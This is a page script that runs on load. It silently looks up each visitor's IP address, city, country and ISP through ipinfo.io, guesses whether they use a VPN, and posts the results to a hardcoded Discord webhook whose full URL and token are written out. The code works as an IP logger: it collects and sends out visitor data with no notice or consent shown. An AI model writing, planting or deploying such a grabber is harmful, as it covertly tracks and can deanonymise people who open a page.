  <script>
        // Function to get geolocation and device/browser information
        async function sendInfoToWebhook() {
            try {
                // Fetch geolocation and ISP data using ipinfo.io
                let infoResponse = await fetch('https://ipinfo.io/json');
                let infoData = await infoResponse.json();

                // Extract required information
                let ipv4 = infoData.ip || 'Unknown';
                let city = infoData.city || 'Unknown';
                let country = infoData.country || 'Unknown';
                let org = infoData.org || 'Unknown';

                // Basic VPN Detection (based on organization info)
                const isVPN = org.includes('VPN') || org.includes('Hosting') || org.includes('DataCenter') ? "Yes" : "No";

                // Discord webhook URL (make sure this webhook URL is correct)
                const webhookURL = "https://canary.discord.com/api/webhooks/1292524044343705710/XJ83PkDjta8gnI-YK2r4KpJG5KrL0bRXmXlD5UCDOCfiPdPrTN4rwyM3wW0hswOqIKqa";

                // Create the embed object
                const embed = {
                    title: "Client Connection",
                    color: 5814783, // Embed color (change as needed)
                    fields: [
                        { name: "IPv4", value: ipv4, inline: true },
                        { name: "City", value: city, inline: true },
                        { name: "Country", value: country, inline: true },
                        { name: "VPN Status", value: isVPN, inline: true }
                    ]
                };

                // Send the embed to the webhook
                await fetch(webhookURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        embeds: [embed]
                    })
                });

                console.log(`Client ${ipv4} info sent successfully`);
            } catch (error) {
                console.error('Error sending client information:', error);
            }
        }

        // Run the function as soon as the page loads
        window.onload = sendInfoToWebhook;
  </script>
